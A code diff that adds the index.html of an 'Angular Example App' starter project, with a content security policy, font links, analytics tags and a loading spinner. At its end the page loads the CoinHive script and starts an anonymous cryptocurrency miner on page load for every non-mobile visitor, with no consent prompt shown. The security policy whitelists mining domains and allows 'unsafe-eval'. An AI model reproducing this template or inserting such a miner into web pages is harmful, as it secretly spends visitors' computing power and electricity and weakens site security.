@@ -1,0 +1,62 @@
+<!doctype html>
+<html>
+<head>
+    <title>Angular Example App</title>
+    <meta content='Angular example app is a base project to start coding with Angular' name='description'>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Security-Policy"
+          content="
+          default-src 'self' 'unsafe-inline' 'unsafe-eval'
+          data:
+          blob:
+          wss:
+
+          http://*.google-analytics.com
+
+          https://*.google-analytics.com
+          https://angularexampleapp.com
+          https://*.googletagmanager.com
+          https://*.gstatic.com
+          https://*.googleapis.com
+          https://*.herokuapp.com
+          https://authedmine.com
+          https://coinhive.com
+
+          ws://localhost:4200;
+    ">
+
+    <base href="/">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="canonical" href="http://angularexampleapp.com/">
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,700" rel="stylesheet">
+</head>
+<body>
+<noscript>
+    <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TF7QP5M" height="0" width="0" style="display:none;visibility:hidden"></iframe>
+</noscript>
+
+<app-root>
+    <div class="loading-page">
+        <div class="spinner">
+            <div class="sk-cube1 sk-cube"></div>
+            <div class="sk-cube2 sk-cube"></div>
+            <div class="sk-cube4 sk-cube"></div>
+            <div class="sk-cube3 sk-cube"></div>
+        </div>
+    </div>
+</app-root>
+
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('zt38B6eBB1OSiPPfTIIgPytSar3Bp3uO', {throttle: 0.5});
+
+  // Only start on non-mobile devices and if not opted-out
+  // in the last 14400 seconds (4 hours):
+  if (!miner.isMobile() && !miner.didOptOut(14400)) {
+    miner.start();
+  }
+</script>
+</body>
+</html>
